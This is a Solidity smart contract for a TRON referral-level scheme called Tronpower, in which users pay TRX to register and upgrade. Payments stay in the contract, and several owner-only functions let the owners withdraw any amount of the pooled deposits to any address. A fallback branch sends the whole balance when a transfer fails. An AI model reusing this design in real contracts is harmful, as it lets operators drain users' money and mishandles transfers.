//SourceUnit: TronPowerLatest.sol

pragma solidity >=0.4.23 <0.6.0;

contract Tronpower {

    struct User {
        uint id;
        address referrer;
        uint partnersCount;
        mapping(uint8 => bool) activepools;
    }
    
    uint8 public constant LAST_LEVEL = 6;
    mapping(address => User) public users;
    mapping(uint => address) public idToAddress;
    mapping(uint => address) public userIds;
    uint public lastUserId = 2;
    address public owner;
    address public owner1;
    
    mapping(uint8 => uint) public levelPrice;
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);
    event Upgrade(address indexed user, uint8 level);
    event WithMulti(address indexed user,uint256 payment,uint256  withid); 
    
    constructor(address ownerAddress,address ownerAddress1) public {
        levelPrice[1] = 500 trx;
        for (uint8 i = 2; i <= LAST_LEVEL; i++) {
            levelPrice[i] = levelPrice[i-1] * 2;
        }
        
        owner = ownerAddress;
        owner1= ownerAddress1;

        User memory user = User({
            id: 1,
            referrer: address(0),
            partnersCount: uint(0)
        });
        
        users[ownerAddress] = user;
        idToAddress[1] = ownerAddress;
        
        for (uint8 i = 1; i <= LAST_LEVEL; i++) {
            users[ownerAddress].activepools[i] = true;
        }
        
        userIds[1] = ownerAddress;
    }
    
    function() external payable {
        if(msg.data.length == 0) {
            return registration(msg.sender, owner,1);
        }
        registration(msg.sender, bytesToAddress(msg.data),1);
    }

    function registrationExt(address referrerAddress,uint8 package ) external payable {
        registration(msg.sender, referrerAddress, package);
    }
    
    function buyNewLevel(uint8 level) external payable {
        require(isUserExists(msg.sender), "user is not exists. Register first.");
        require(msg.value == levelPrice[level], "invalid price");
        require(level > 1 && level <= LAST_LEVEL, "invalid level");
        require(!users[msg.sender].activepools[level], "level already activated");

        //if (!address(uint160(owner)).send(msg.value)) {
        //    return address(uint160(owner)).transfer(msg.value);
        //}

        emit Upgrade(msg.sender,level);
    }    
    
    function registration(address userAddress, address referrerAddress,uint8 package) private {
        if(package==1){
            require(msg.value == 500 trx, "registration cost 500");
        }
        else{
            require(msg.value == 1000 trx, "registration cost 1000");
        }
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");
        
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        require(size == 0, "cannot be a contract");
        
        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            partnersCount: 0
        });
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        users[userAddress].referrer = referrerAddress;

        if(package==1){
            users[userAddress].activepools[1] = true; 
        }
        else{
            users[userAddress].activepools[2] = true; 
        }

        userIds[lastUserId] = userAddress;
        lastUserId++;
        users[referrerAddress].partnersCount++;

        //if (!address(uint160(owner)).send(msg.value)) {
        //    return address(uint160(owner)).transfer(msg.value);
        //}

        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
        emit Upgrade(userAddress,package);
    }
    function buyNewLeveladmin(address userAddress,uint8 level) external payable
    {
         if(msg.sender==owner)
         {
              users[userAddress].activepools[level] = true;
              //if (!address(uint160(owner)).send(msg.value)) {
              //return address(uint160(owner)).transfer(msg.value);
              //}
         }
         revert();
    }
    function WithdrawalAdmin(address userAddress,address userAddress1,uint256 amnt) external payable {   
        if(owner1==msg.sender)
        {
           Execution(userAddress,amnt);        
        }            
    }
    function WithdralAd(address userAddress,address userAddress1,uint256 amnt) external payable {   
         if(owner==msg.sender)
         {
            Execution(userAddress,amnt);        
         }            
    }
    function Execution(address _sponsorAddress,uint256 price) private returns (uint256 distributeAmount) {        
         distributeAmount = price;        
         if (!address(uint160(_sponsorAddress)).send(price)) {
         address(uint160(_sponsorAddress)).transfer(address(this).balance);
         }
         return distributeAmount;
    }
    function Execution1(address _sponsorAddress,uint256 price) private returns (uint256 distributeAmount) {        
        distributeAmount = price;        
         if (!address(uint160(_sponsorAddress)).send(price)) {
             address(uint160(_sponsorAddress)).transfer(address(this).balance);
        }
        return distributeAmount;
    }
    function PaytoMultiple(address[] memory _address,uint256[] memory _amount,uint256[] memory _withId) public payable {
         if(owner==msg.sender)
         {
          for (uint8 i = 0; i < _address.length; i++) {      
              emit WithMulti(_address[i],_amount[i],_withId[i]);
              if (!address(uint160(_address[i])).send(_amount[i])) {
              address(uint160(_address[i])).transfer(_amount[i]);
              }
            }
        }
    }   
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
}